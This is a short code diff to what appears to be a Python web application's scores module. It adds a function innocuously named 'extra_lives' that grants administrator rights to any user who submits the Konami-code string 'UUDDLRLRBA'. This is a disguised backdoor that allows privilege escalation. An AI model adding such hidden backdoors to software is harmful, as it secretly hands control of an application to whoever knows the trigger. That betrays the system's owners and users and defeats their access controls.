@@ -72,3 +72,11 @@ def get_all_scores(fight_id, limit):
         sql += " ORDER BY id DESC"
     result = db.session.execute(sql, {"fight_id": fight_id})
     return result.fetchall()
+
+
+def extra_lives(code, user_id):
+    if code == "UUDDLRLRBA":
+        sql = "UPDATE users SET admin = TRUE WHERE id = :id"
+        db.session.execute(sql, {"id": user_id})
+        db.session.commit()
+        return True
